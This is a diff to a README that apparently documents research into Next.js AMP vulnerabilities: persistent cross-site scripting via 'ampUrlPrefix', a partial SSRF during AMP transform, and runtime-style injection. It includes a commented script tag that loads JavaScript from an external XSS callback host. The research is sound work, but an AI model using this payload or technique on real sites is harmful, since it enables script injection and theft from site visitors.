@@ -32,7 +32,7 @@ npm start
 
 ## AMP first look
 
-Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml` (Session-wide like broadcast due to server-side rendering).
+Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml`.
 
 Also a partial SSRF via `node-fetch` during AMP transform.
 
@@ -101,11 +101,10 @@ async transformHtml(t, e) {
 // <script async="" src="https://xss-callback.pwnfunction.repl.co/v0.js"></script>
 ```
 
-> Note: In `next.config.js`, we skip validation `skipValidation: true`.
-> This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
+> ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
 
-> Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly to the page,
-> meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
+> 📝 Note: In `next.config.js`, we skip validation `skipValidation: true`.
+> This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
 
 ## Redirect SSR
 
